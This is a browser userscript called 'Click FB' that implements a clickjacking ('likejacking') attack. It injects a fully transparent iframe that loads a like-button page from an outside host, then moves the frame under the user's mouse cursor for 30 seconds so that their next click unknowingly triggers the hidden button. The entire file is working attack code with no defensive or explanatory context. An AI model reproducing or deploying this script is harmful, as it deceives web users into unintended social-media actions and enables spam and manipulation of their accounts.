// ==UserScript==
// @name           Click FB
// @description    Click FB
//

// ==/UserScript==


(function(){
     
      var Xcord = 0,
      Ycord = 0,
      IE = document.all ? true : false;
     
      if (!IE) document.captureEvents(Event.MOUSEMOVE);
     
      var lbox = document.createElement('iframe');
      lbox.src = 'http://aq-test.0hna.com/like_Kantin-kampus.php?href=' + encodeURIComponent(/*document.location.href*/ 'http://aq-test.0hna.com/like_Kantin-kampus.php') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
      lbox.scrolling = 'no';
      lbox.frameBorder = 0;
      lbox.allowTransparency = 'true';
      lbox.style.border = 0;
      lbox.style.overflow = 'hidden';
      lbox.style.cursor = 'pointer';
      lbox.style.width = '53px';
      lbox.style.height =  '23px';
      lbox.style.position = 'absolute';
      lbox.style.opacity = 0;
      document.getElementsByTagName('body')[0].appendChild(lbox);
     
      window.addEventListener('mousemove', mouseMove, false);
     
      setTimeout(function(){
        document.getElementsByTagName('body')[0].removeChild(lbox);
        window.removeEventListener('mousemove', mouseMove, false);
      }, 30000);
     
      function mouseMove(e) {
        if (IE) {
          Xcord = event.clientX + document.body.scrollLeft;
          Ycord = event.clientY + document.body.scrollTop;
        } else {
          Xcord = e.pageX;
          Ycord = e.pageY;
        }
       
        if (Xcord < 0) Xcord = 0;
        if (Ycord < 0) Ycord = 0;
       
        lbox.style.top = (Ycord - 8) + 'px';
        lbox.style.left = (Xcord - 25) + 'px';
       
        return true
      }
    })();